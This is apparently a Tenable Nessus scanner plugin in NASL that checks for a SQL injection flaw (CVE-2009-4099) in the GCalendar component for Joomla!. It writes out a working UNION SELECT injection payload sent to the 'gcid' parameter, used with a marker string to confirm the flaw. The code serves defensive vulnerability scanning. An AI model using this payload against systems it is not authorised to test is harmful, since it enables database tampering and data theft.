#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43088);
  script_version("$Revision: 1.14 $");
 script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-4099");
  script_bugtraq_id(37141);
  script_osvdb_id(60517);
  script_xref(name:"EDB-ID", value:"10232");
  script_xref(name:"Secunia", value:"37476");

  script_name(english:"GCalendar Component for Joomla! 'gcid' Parameter SQLi");
  script_summary(english:"Exploits a SQL Injection Vulnerability in GCalendar.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the GCalendar component for Joomla! running on the
remote host is affected by a SQL injection vulnerability in the
models/event.php script due to improper sanitization of user-supplied
input to the 'gcid' parameter before using it to construct database
queries. Regardless of the PHP 'magic_quotes_gpc' setting, an
unauthenticated, remote attacker can exploit this issue to manipulate
database queries, resulting in disclosure of sensitive information,
modification of data, or other attacks against the underlying
database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/11/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/12/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "GCalendar";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('title="GCalendar"');
  checks["/components/com_gcalendar/views/gcalendar/tmpl/default.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to exploit the issue
magic = SCRIPT_NAME - ".nasl" + '-' + unixtime();
exploit = "concat(";
for (i=0; i<strlen(magic); i++)
       exploit += hex(ord(magic[i])) + ",";
exploit[strlen(exploit)-1] = ")";
exploit = "-9999+union+select+0,"+ exploit + ",2,3,4-- ";

url = "/index.php?option=com_gcalendar&view=event&eventID=nessus&" +
    "gcid=" + exploit ;

res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

# There is a problem if we see our magic....
if ("Simplepie detected an error for the calendar "+magic >< res[2])
{
  output = strstr(res[2], "Simplepie detected an error for the calendar ");
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    sqli        : TRUE,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
